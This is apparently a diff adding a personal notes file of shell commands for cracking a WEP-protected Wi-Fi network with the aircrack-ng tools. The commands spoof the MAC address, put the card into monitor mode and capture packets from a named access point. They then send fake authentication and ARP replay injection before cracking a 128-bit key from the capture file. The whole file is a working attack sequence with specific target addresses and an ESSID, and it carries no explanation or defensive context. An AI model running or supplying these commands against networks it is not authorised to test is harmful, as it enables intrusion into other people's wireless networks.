@@ -1,0 +1,25 @@
+
+
+ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+
+airmon-ng start wlan0
+
+airodump-ng wlan0 
+
+airodump-ng wlan0 -c #channel --bssid 34:6B:D3:C6:F9:66 -w #file_data
+
+# faceauth
+aireplay-ng -1 0 -a 24:DB:AC:40:FE:38 -h 00:11:22:33:44:55 -e "MobileWiFi-fe38" wlan0
+
+aireplay-ng -1 0 -a 24:DB:AC:40:FE:38 -h 00:11:22:33:44:55  wlan0
+
+
+#ARP replay
+aireplay-ng -3 -b 24:DB:AC:40:FE:38 -h 00:11:22:33:44:55 wlan0
+
+
+
+aircrack-ng -n 128 test-01.cap
+
